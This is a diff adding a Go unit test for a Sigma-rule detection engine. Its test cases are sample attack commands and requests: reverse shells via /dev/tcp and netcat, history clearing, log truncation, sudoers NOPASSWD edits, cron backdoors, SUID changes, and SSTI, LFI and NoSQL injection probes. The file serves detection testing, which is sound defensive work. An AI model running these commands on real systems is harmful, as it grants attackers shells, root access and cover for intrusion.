@@ -103,3 +103,126 @@ detection:
 		t.Errorf("Expected no CIDR match for 203.0.113.10")
 	}
 }
+
+func TestCuratedSigmaRulePackDetections(t *testing.T) {
+	engine := NewSigmaEngine("") // Auto-loads curated rule pack
+
+	cases := []struct {
+		name       string
+		log        string
+		fields     map[string]string
+		expectedID string
+		mitreID    string
+	}{
+		// 1. Linux Reverse Shells
+		{
+			name:       "Bash /dev/tcp Reverse Shell",
+			log:        "bash -i >& /dev/tcp/198.51.100.22/4444 0>&1",
+			fields:     map[string]string{"CommandLine": "bash -i >& /dev/tcp/198.51.100.22/4444 0>&1"},
+			expectedID: "sigma-linux-revshell",
+			mitreID:    "T1059.004",
+		},
+		{
+			name:       "Netcat Shell Spawn",
+			log:        "nc -e /bin/sh 198.51.100.55 1337",
+			fields:     map[string]string{"CommandLine": "nc -e /bin/sh 198.51.100.55 1337"},
+			expectedID: "sigma-linux-revshell",
+			mitreID:    "T1059.004",
+		},
+		{
+			name:       "Python PTY Spawn One-Liner",
+			log:        `python3 -c "import pty; pty.spawn('/bin/bash')"`,
+			fields:     map[string]string{"CommandLine": `python3 -c "import pty; pty.spawn('/bin/bash')"`},
+			expectedID: "sigma-linux-revshell",
+			mitreID:    "T1059.004",
+		},
+
+		// 2. Defense Evasion & Anti-Forensics
+		{
+			name:       "History Clear & Unset HISTFILE",
+			log:        "unset HISTFILE && history -c",
+			fields:     map[string]string{"CommandLine": "unset HISTFILE && history -c"},
+			expectedID: "sigma-linux-evasion",
+			mitreID:    "T1070",
+		},
+		{
+			name:       "Log File Truncation",
+			log:        "truncate -s 0 /var/log/auth.log",
+			fields:     map[string]string{"CommandLine": "truncate -s 0 /var/log/auth.log"},
+			expectedID: "sigma-linux-evasion",
+			mitreID:    "T1070",
+		},
+		{
+			name:       "Security Daemon Termination",
+			log:        "systemctl stop suricata",
+			fields:     map[string]string{"CommandLine": "systemctl stop suricata"},
+			expectedID: "sigma-linux-evasion",
+			mitreID:    "T1070",
+		},
+
+		// 3. Persistence & Privilege Escalation
+		{
+			name:       "Sudoers NOPASSWD Modification",
+			log:        "echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
+			fields:     map[string]string{"CommandLine": "echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"},
+			expectedID: "sigma-linux-persistence",
+			mitreID:    "T1053",
+		},
+		{
+			name:       "Cronjob Persistence Directory Access",
+			log:        "cp /tmp/backdoor /etc/cron.hourly/backup_sync",
+			fields:     map[string]string{"CommandLine": "cp /tmp/backdoor /etc/cron.hourly/backup_sync"},
+			expectedID: "sigma-linux-persistence",
+			mitreID:    "T1053",
+		},
+		{
+			name:       "SUID Bit Set on Binary",
+			log:        "chmod u+s /usr/bin/python3",
+			fields:     map[string]string{"CommandLine": "chmod u+s /usr/bin/python3"},
+			expectedID: "sigma-linux-persistence",
+			mitreID:    "T1053",
+		},
+
+		// 4. Advanced Web Exploits & Modern Injection
+		{
+			name:       "Server-Side Template Injection (SSTI)",
+			log:        `GET /profile?name={{7*7}} HTTP/1.1`,
+			fields:     map[string]string{"RequestURI": "/profile?name={{7*7}}"},
+			expectedID: "sigma-web-advanced",
+			mitreID:    "T1190",
+		},
+		{
+			name:       "PHP Filter Wrapper LFI",
+			log:        `GET /index.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1`,
+			fields:     map[string]string{"RequestURI": "/index.php?page=php://filter/convert.base64-encode/resource=config.php"},
+			expectedID: "sigma-web-advanced",
+			mitreID:    "T1190",
+		},
+		{
+			name:       "Out-of-Band OAST Exfiltration Probe",
+			log:        `GET /search?q=test.oastify.com HTTP/1.1`,
+			fields:     map[string]string{"RequestURI": "/search?q=test.oastify.com"},
+			expectedID: "sigma-web-advanced",
+			mitreID:    "T1190",
+		},
+		{
+			name:       "NoSQL Injection Operator",
+			log:        `POST /login HTTP/1.1 {"username": {"$gt": ""}, "password": {"$gt": ""}}`,
+			fields:     map[string]string{"RawLog": `POST /login HTTP/1.1 {"username": {"$gt": ""}, "password": {"$gt": ""}}`},
+			expectedID: "sigma-web-advanced",
+			mitreID:    "T1190",
+		},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			rule, matched := engine.EvaluateEvent(tc.log, tc.fields)
+			if !matched || rule == nil {
+				t.Fatalf("Failed to detect %s (log: %s)", tc.name, tc.log)
+			}
+			if rule.ID != tc.expectedID {
+				t.Errorf("Expected rule ID %s, got %s", tc.expectedID, rule.ID)
+			}
+		})
+	}
+}
